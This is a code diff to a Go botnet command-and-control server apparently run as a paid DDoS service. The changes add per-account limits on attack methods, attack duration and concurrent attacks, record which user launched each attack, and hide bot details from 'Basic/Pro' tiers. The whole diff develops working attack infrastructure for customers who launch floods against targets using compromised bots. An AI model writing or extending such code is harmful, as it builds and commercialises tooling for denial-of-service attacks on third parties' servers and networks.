@@ -360,6 +360,44 @@ func handleRequest(conn net.Conn) {
 					port := parts[2]
 					duration := parts[3]
 
+					// Validate method against user's allowed methods
+					methodName := strings.TrimPrefix(strings.ToLower(method), "!")
+					methodAllowed := false
+					for _, m := range c.user.Methods {
+						if strings.EqualFold(m, methodName) || strings.EqualFold(m, method) {
+							methodAllowed = true
+							break
+						}
+					}
+					if len(c.user.Methods) > 0 && !methodAllowed {
+						conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Method %s not available for your account\r\n\033[0m", methodName)))
+						continue
+					}
+
+					// Validate duration against user's maxtime
+					durSec := 0
+					fmt.Sscanf(duration, "%d", &durSec)
+					if c.user.Maxtime > 0 && durSec > c.user.Maxtime {
+						conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Duration exceeds your limit (%ds max)\r\n\033[0m", c.user.Maxtime)))
+						continue
+					}
+
+					// Validate concurrent attack limit
+					if c.user.Concurrents > 0 {
+						ongoingAttacksLock.RLock()
+						running := 0
+						for _, a := range ongoingAttacks {
+							if a.username == c.user.Username && time.Since(a.start) < a.duration {
+								running++
+							}
+						}
+						ongoingAttacksLock.RUnlock()
+						if running >= c.user.Concurrents {
+							conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Concurrent limit reached (%d/%d)\r\n\033[0m", running, c.user.Concurrents)))
+							continue
+						}
+					}
+
 					// Check for proxy mode: -p <proxy_url>
 					proxyMode := false
 					proxyURL := ""
@@ -396,6 +434,7 @@ func handleRequest(conn net.Conn) {
 						port:     port,
 						duration: dur,
 						start:    time.Now(),
+						username: c.user.Username,
 					}
 					ongoingAttacksLock.Lock()
 					ongoingAttackSeq++
@@ -483,6 +522,11 @@ func handleRequest(conn net.Conn) {
 					showBanner(conn)
 
 				case "bots", "bot":
+					if !c.canUseBotManagement() {
+						// Basic/Pro only see bot count, not details
+						conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
+						continue
+					}
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
 					// Show bot details
 					botConnsLock.RLock()
